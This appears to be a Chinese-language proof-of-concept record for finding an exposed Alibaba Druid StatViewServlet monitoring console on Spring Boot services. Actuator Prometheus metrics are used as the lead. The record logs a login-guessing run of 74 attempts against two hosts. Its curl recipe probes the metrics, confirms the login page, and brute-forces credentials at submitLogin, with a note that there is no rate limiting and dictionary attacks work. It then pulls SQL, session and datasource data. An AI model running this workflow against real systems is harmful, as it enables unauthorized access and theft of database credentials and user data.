# Druid StatViewServlet 暴露检测（含从 actuator/prometheus 的 statViewServlet 指标反推）

- **code**: druid-statviewservlet-暴露检测-含从-actuator-prometheus-的-statviewservlet-指标反推
- **kind**: poc
- **category**: info-leak
- **component**: Alibaba Druid StatViewServlet
- **severity**: medium
- **language**: bash
- **source**: manual
- **verified**: 1
- **verified_note**: 在 203.0.113.123:8081 与 203.0.113.120:8081（Spring Boot「client」会员管理 API）实测：`/druid/example.com` → 302 Location: http://203.0.113.123:8081/druid/login.html；`/druid/login.html` → 200 / 3423B / `<title>druid monitor</title>` / 字段 loginUsername+loginPassword / 提交端点 submitLogin；`POST /druid/submitLogin` 空参返回 200 + "Error"（5B）；basic/sql/websession/datasource/weburi/spring/version/api/reset-all.json 未登录全部 302。Druid 口令实测非默认（37 组 × 2 主机 = 74 次 submitLogin 全返 Error），故本次仅确认暴露、未取得监控数据。
- **tags**: druid,spring-boot,actuator,监控台,信息泄露
- **created_at**: 2026-09-28T08:52:05.034Z
- **found_by**: exploit

## 描述

Spring Boot 应用暴露 Druid StatViewServlet 监控台的判定方式。

**为什么值得单独记录**：`/actuator` 端点往往只放行 `self` + `prometheus`，但 **`/actuator/prometheus` 的 `tomcat_servlet_request_seconds_count{name="statViewServlet"}` 指标会直接说明 Druid 监控 servlet 是否已启用（含调用次数）** —— 这是从 actuator 反推 Druid 存在的最可靠线索，比盲扫 `/druid/` 路径高效。
判定要点（避免把同形路径误判为 Druid）：
1. `GET /druid/example.com` → **302 且 Location 精确指向同站 `/druid/login.html`**（Druid ResourceServlet 的标准鉴权跳转），Content-Length: 0；
2. `GET /druid/login.html` → 200，页面 `<title>druid monitor</title>`，表单字段为 `loginUsername` / `loginPassword`，提交端点为相对路径 `submitLogin`；
3. `POST /druid/submitLogin` → 返回 **`success`（5 字节以下仅含 success）或 `Error`（5 字节）** 的纯文本语义，用于在线口令判定，无频控。
未登录时所有监控 JSON 一起 302：`basic.json`、`datasource.json`、`sql.json`、`weburi.json`、`websession.json`、`spring.json`、`version.json`、`api.json`、`reset-all.json`。
价值：一旦进入可读 **全部 SQL 与执行参数（sql.html/sql.json，含认证 SQL 中的用户名）、活跃 HTTP 会话（websession.json）、数据源连接串**，等价于绕过前端直接观测后台账号与凭据。

## 用法

```
替换 BASE 后直接执行；第 0 步可选（用 prometheus 指标确认 statViewServlet 是否被启用）。
BASE=http://TARGET:8081
# 0) 从 actuator 反推 Druid 是否启用（关键线索）
curl -s "$BASE/actuator/prometheus" | grep -i 'statViewServlet'
# 1) 判定 Druid 监控台存在（302 -> /druid/login.html）
curl -i -s "$BASE/druid/example.com" | head -5
# 2) 确认登录页特征（druid monitor / loginUsername / submitLogin）
curl -s "$BASE/druid/login.html" | grep -E 'title|loginUsername|submitLogin'
# 3) 在线口令判定（返回 success 即成功；无频控，可字典化）
curl -s -X POST -d 'loginUsername=ruid&loginPassword=ruid' "$BASE/druid/submitLogin"
# 4) 成功后取监控数据
curl -s -b cookies.txt "$BASE/druid/sql.json" | head -c 2000
```
